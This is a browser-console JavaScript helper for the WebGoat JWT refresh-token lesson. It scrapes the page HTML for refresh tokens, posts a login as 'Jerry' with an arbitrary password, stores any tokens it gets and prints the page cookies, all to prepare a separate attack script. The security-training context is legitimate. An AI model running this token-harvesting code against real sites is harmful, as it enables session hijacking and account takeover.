    // ===================================================================
    // GET FRESH REFRESH TOKEN - NO SPECIAL CHARACTERS
    // Run this FIRST to get a valid refresh token
    // ===================================================================

    (async function() {
        
        console.log('===================================================================');
        console.log('GETTING FRESH REFRESH TOKEN');
        console.log('===================================================================');
        
        console.log('\n[METHOD 1] Checking page HTML for tokens...');
        
        const html = document.documentElement.innerHTML;
        
        // Search for refresh_token patterns
        const patterns = [
            /refresh_token["\']?\s*:\s*["']([^"']+)/gi,
            /refreshToken["\']?\s*:\s*["']([^"']+)/gi,
            /"refresh_token":\s*"([^"]+)"/gi,
            /refresh_token=([a-zA-Z0-9\-_]+)/gi
        ];
        
        let foundInHtml = false;
        for (const pattern of patterns) {
            const matches = [...html.matchAll(pattern)];
            if (matches.length > 0) {
                console.log('FOUND refresh_token in HTML!');
                matches.forEach((match, i) => {
                    const token = match[1];
                    console.log('Token', i + 1 + ':', token);
                    window.myRefreshToken = token;
                });
                foundInHtml = true;
                break;
            }
        }
        
        if (!foundInHtml) {
            console.log('Not found in HTML');
        }
        
        // Try to request token from server
        console.log('\n[METHOD 2] Requesting token from /JWT/refresh/login...');
        
        try {
            const resp = await fetch('/WebGoat/JWT/refresh/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    user: 'Jerry',
                    password: 'anything'
                })
            });
            
            console.log('Response status:', resp.status, resp.statusText);
            
            if (resp.ok) {
                const data = await resp.json();
                console.log('Response data:', data);
                
                if (data.refresh_token) {
                    console.log('\nSUCCESS! Got refresh_token from server!');
                    console.log('Refresh token:', data.refresh_token);
                    window.myRefreshToken = data.refresh_token;
                    foundInHtml = true;
                }
                
                if (data.access_token) {
                    console.log('Access token:', data.access_token);
                    window.myAccessToken = data.access_token;
                }
            } else {
                console.log('Request failed (this is normal for some lessons)');
            }
        } catch (e) {
            console.log('Error (this is normal):', e.message);
        }
        
        // Final check
        console.log('\n===================================================================');
        
        if (window.myRefreshToken) {
            console.log('SUCCESS! REFRESH TOKEN FOUND AND SAVED!');
            console.log('===================================================================');
            console.log('Token:', window.myRefreshToken);
            console.log('Token length:', window.myRefreshToken.length);
            console.log('\nThe refresh token has been saved to: window.myRefreshToken');
            console.log('\nNow run the attack script (jwt_refresh_CLEAN.js)');
            console.log('Or paste the attack code from JWT_REFRESH_COPYPASTE_READY.txt');
        } else {
            console.log('REFRESH TOKEN NOT FOUND AUTOMATICALLY');
            console.log('===================================================================');
            console.log('\nYou need to get it manually:');
            console.log('\n1. Look at the lesson page for these buttons:');
            console.log('   - Login');
            console.log('   - Get Token');
            console.log('   - Checkout');
            console.log('   - Add to Cart');
            console.log('\n2. Open Network tab (F12 -> Network)');
            console.log('\n3. Click one of those buttons');
            console.log('\n4. Look at the Network requests');
            console.log('   Find POST requests to /JWT/refresh/*');
            console.log('\n5. Click on the request');
            console.log('   Go to Response tab');
            console.log('   Look for "refresh_token": "..."');
            console.log('\n6. Copy the refresh_token value (just the token, no quotes)');
            console.log('\n7. Paste it here in console:');
            console.log('   window.myRefreshToken = "PASTE_TOKEN_HERE";');
            console.log('\n8. Then run the attack script');
            console.log('\nCurrent cookies:', document.cookie || '(none)');
        }
        
        console.log('\n===================================================================');
        
    })();
